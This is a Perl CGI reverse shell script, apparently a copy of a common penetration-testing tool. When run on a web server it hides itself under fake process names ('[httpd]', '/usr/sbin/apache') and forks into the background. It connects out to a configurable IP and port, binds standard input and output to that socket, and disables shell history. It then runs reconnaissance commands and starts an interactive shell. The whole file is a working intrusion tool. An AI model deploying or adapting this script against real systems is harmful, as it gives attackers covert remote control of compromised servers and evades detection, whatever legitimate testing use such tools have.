#!/usr/bin/perl -w

use strict;
use Socket;
use FileHandle;
use POSIX;
my $VERSION = "1.0";

my $ip = '127.0.0.1';
my $port = 1234;

my $daemon = 1;
my $auth   = 0;
my $authorised_client_pattern = qr(^127\.0\.0\.1$);

my $global_page = "";
my $fake_process_name = "/usr/sbin/apache";

$0 = "[httpd]";

if (defined($ENV{'REMOTE_ADDR'})) {
	cgiprint("Browser IP address appears to be: $ENV{'REMOTE_ADDR'}");

	if ($auth) {
		unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {
			cgiprint("ERROR: Your client isn't authorised to view this page");
			cgiexit();
		}
	}
} elsif ($auth) {
	cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access");
	cgiexit(0);
}

if ($daemon) {
	my $pid = fork();
	if ($pid) {
		cgiexit(0);
	}

	setsid();
	chdir('/');
	umask(0);
}

socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
	cgiprint("Sent reverse shell to $ip:$port");
	cgiprintpage();
} else {
	cgiprint("Couldn't open reverse shell to $ip:$port: $!");
	cgiexit();	
}

open(STDIN, ">&SOCK");
open(STDOUT,">&SOCK");
open(STDERR,">&SOCK");
$ENV{'HISTFILE'} = '/dev/null';
system("w;uname -a;id;pwd");
exec({"/bin/sh"} ($fake_process_name, "-i"));

sub cgiprint {
	my $line = shift;
	$line .= "<p>\n";
	$global_page .= $line;
}

sub cgiexit {
	cgiprintpage();
	exit 0;
}

sub cgiprintpage {
	print "Content-Length: " . length($global_page) . "\r
Connection: close\r
Content-Type: text\/html\r\n\r\n" . $global_page;
}
